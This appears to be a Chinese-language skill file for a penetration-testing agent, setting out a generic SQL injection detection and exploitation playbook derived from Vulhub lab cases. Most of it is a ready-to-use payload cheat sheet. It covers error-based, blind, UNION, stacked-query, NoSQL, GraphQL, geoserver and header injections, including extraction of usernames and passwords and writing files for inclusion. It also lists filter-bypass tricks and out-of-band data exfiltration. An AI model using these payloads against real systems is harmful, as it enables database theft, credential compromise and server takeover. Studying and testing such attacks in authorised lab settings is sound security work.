---
name: vulhub-sqli
description: sqli 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# SQLI 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

基于提供的实例，SQL注入漏洞的入口点已高度多样化，不再局限于传统的`id`或`name`参数。渗透测试人员应遵循以下抽象模式进行系统性探测：

1.  **参数结构探测**：
    *   **数组参数**：重点关注参数名以`[]`结尾或包含`[`、`]`符号的参数。例如 `ids[]`、`toggle_ids[]`、`name[0]`。这些参数在处理时可能被框架解析为数组，其键或值可能被直接拼接进SQL语句。
    *   **嵌套对象/字典参数**：寻找形如 `ids[0][product_id][from]` 的复杂参数结构。这类参数常用于构建复杂的查询条件，其内部值可能未经充分过滤。
    *   **排序与分页参数**：特别关注 `order`、`orderBy`、`sort`、`fullordering` 等参数。这些参数常被直接用于 `ORDER BY` 子句，是注入的高发区。
    *   **JSON/GraphQL请求体**：在POST请求中，检查JSON或GraphQL负载。重点查看 `query`、`variables`、`condition`、`metricName`、`orders` 等字段，这些字段的值可能在服务端被解析并用于数据库查询。

2.  **HTTP请求头探测**：
    *   某些应用程序会将客户端信息（如 `Referer`、`X-Forwarded-Host`、`User-Agent`）记录到数据库中。这些头部字段的值可能被直接用于SQL查询，构成注入点。

3.  **功能点关联探测**：
    *   **数据展示功能**：如图表（`graph_view.php`）、日志查询（`queryLogs`）、产品列表（`catalog`）、字段管理（`com_fields`）等。这些功能通常涉及复杂的数据库查询和筛选。
    *   **API接口**：尤其是提供数据筛选、排序、搜索功能的RESTful API或GraphQL端点。
    *   **文件包含或模板渲染相关参数**：虽然不直接是SQLi，但某些SQLi漏洞的利用链会涉及文件操作（如写入Webshell）。

4.  **上下文识别**：
    *   识别后端数据库类型（MySQL、PostgreSQL、Oracle、SQLite、MongoDB等），因为Payload语法和函数（如 `updatexml`、`extractvalue` 用于MySQL；`UTL_INADDR` 用于Oracle；`$regex` 用于MongoDB）因数据库而异。
    *   判断注入类型：错误回显、布尔盲注、时间盲注、联合查询、堆叠查询等。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体CVE标识，按执行上下文和数据库类型分类。

### **错误回显注入 (Error-Based)**
利用数据库报错函数将查询结果回显到错误信息中。
```http
# 通用报错函数 (MySQL)
toggle_ids[]=updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
profileIdx2=extractvalue(1,concat(0x7e,(SELECT version()),0x7e))
ids[0,updatexml(0,concat(0xa,user()),0)]=1
name[0 or updatexml(0,concat(0xa,user()),0)%23]=test
index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)

# Oracle数据库报错
/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is null OR (1+1
```

### **布尔盲注/时间盲注 (Boolean/Time-Based Blind)**
通过应用响应差异或时间延迟判断条件真伪。
```http
# 布尔盲注 (Magento 变体示例)
&ids[0][product_id][to]=)) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -
&ids[0][product_id][to]=)) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -

# 时间盲注 (MeterSphere 变体示例，利用`if`和`sleep`)
POST /api/testcase
{"orders":[{"name":"name","type":",if(1=1,sleep(2),0)"}]}
```

### **联合查询注入 (Union-Based)**
通过 `UNION SELECT` 直接获取数据。
```http
# 在复杂参数中嵌入UNION
/graph_view.php?rfilter=... UNION SELECT 1,2,(select concat(id,0x23,username,0x23,password) from user_auth limit 1),4,5,6,(select user()),(select version()),9,10%23

# 通过序列化数据注入 (ECShop 变体示例)
X-Forwarded-Host: ...ads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}...
```

### **堆叠查询注入 (Stacked Queries)**
执行多条SQL语句，常用于写入文件或执行系统命令（需数据库支持，如SQLite、PostgreSQL）。
```http
# SQLite 示例 (1Panel 变体)
/api/v1/hosts/command/search?orderBy=3;ATTACH DATABASE '/tmp/test.txt' AS test;CREATE TABLE test.exp (data text);

# 插入数据到插件表以实现文件包含 (Cacti 变体)
/graph_view.php?rfilter=...;INSERT INTO plugin_hooks(name,hook,file,status) VALUES (\".\",\"login_before\",\"../log/cacti.log\",1);%23
```

### **NoSQL 注入 (MongoDB)**
利用MongoDB操作符进行注入。
```json
// 在JSON请求中使用 $regex 操作符进行信息探测
{
  "filter": {
    "username": {
      "$regex": "^7" // 探测以7开头的用户名
    }
  }
}
```

### **GraphQL 注入**
注入点位于GraphQL查询的变量中。
```http
POST /graphql HTTP/1.1
{
  "query": "query queryLogs($condition: LogQueryCondition) { queryLogs(condition: $condition) { total logs { serviceId } } }",
  "variables": {
    "condition": {
      "metricName": "sqli' OR '1'='1", // 注入点
      "state": "ALL",
      "paging": { "pageSize": 10 }
    }
  }
}
```

### **OGC Filter 注入 (地理信息系统)**
在地图服务（如WFS）的 `CQL_FILTER` 参数中注入。
```http
/geoserver/ows?service=wfs&request=GetFeature&typeName=...&CQL_FILTER=strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer)) -- ') = true
```

### **Header 注入**
通过HTTP头部字段进行注入。
```http
GET / HTTP/1.1
Host: vulnerable.com
Referer: -1' UNION SELECT 1,version(),3-- -
X-Forwarded-Host: ...user_account|a:2:{s:\"user_id\";s:38:\"0'-(updatexml(1,repeat(user(),2),1))-'\";...
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **数组键名注入**：当PHP等语言将 `name[key]=value` 解析为 `$_GET['name']['key'] = 'value'` 时，注入点可能在 `key` 上而非 `value`。例如 `name[0 or sleep(5)]=test`。
2.  **JSON/序列化数据嵌入注入**：Payload被包裹在序列化字符串（如 `a:2:{s:3:\"num\";s:107:\"PAYLOAD\"}`）或JSON对象中。需要确保Payload本身不破坏序列化/JSON结构（如正确转义引号）。
3.  **二次注入与编码绕过**：参数可能被初步过滤或编码，但在后续逻辑（如反序列化、`urldecode`、`base64_decode`）中被还原并拼接进SQL。尝试多层编码（如 `%2527` 双重URL编码）。
4.  **参数污染**：提交多个同名参数（如 `?id=1&id=2`），应用程序可能以非预期方式处理最后一个或第一个参数，绕过某些过滤逻辑。
5.  **利用框架特性**：
    *   **Django JSON/HStore字段键名注入**：在查询如 `detail__a'b=123` 时，`a'b` 作为键名可能被直接拼接。
    *   **Django `order_by()` 注入**：`order=vuln_collection.name);select updatexml(...)%23`，利用分号或注释截断后续SQL。
6.  **空格与注释符替代**：
    *   使用括号 `()`、换行符 `%0a`、制表符 `%09` 代替空格。
    *   使用 `/**/` 代替空格（在MySQL中）。
    *   使用 `-- -`、`#`、`%23` 作为注释符，确保注释掉原查询的剩余部分。

## [4] 回显与成功判定基准 (Verification)

1.  **直接错误回显**：最明显的标志。提交包含 `updatexml()`、`extractvalue()` 等报错函数的Payload后，观察HTTP响应中是否包含数据库错误信息，且该信息中包含了我们注入的查询结果（如用户名、版本号）。
2.  **布尔状态差异**：
    *   提交两个逻辑相反的Payload（如 `1=1` 和 `1=0`）。
    *   观察页面内容长度、特定关键词出现与否、HTTP状态码、JSON响应结构是否发生可预测的变化。
3.  **时间延迟**：
    *   提交包含 `sleep(5)`、`pg_sleep(5)`、`WAITFOR DELAY '0:0:5'` 等函数的Payload。
    *   测量服务器响应时间是否显著增加（约5秒）。需注意网络延迟和服务器负载的影响，最好多次测试取平均值。
4.  **联合查询回显**：如果页面某处会显示数据库查询结果，通过 `UNION SELECT` 构造Payload，将数据直接输出到页面可见位置。成功标志是在预期位置看到注入的数据。
5.  **DNS/HTTP OOB 外带数据**：在无法直接回显时，利用数据库函数（如 `load_file()` 访问UNC路径，`UTL_HTTP.request`）触发向可控服务器的DNS查询或HTTP请求，从而带出数据。成功标志是在自己的服务器日志中收到包含查询结果的请求。
6.  **堆叠查询生效验证**：对于支持堆叠查询的注入点，尝试执行一个无害但可验证的操作，如 `SELECT 1; CREATE TABLE test_sqli_abcd (id int);`，然后检查表是否被创建。或通过写入文件再访问的方式验证。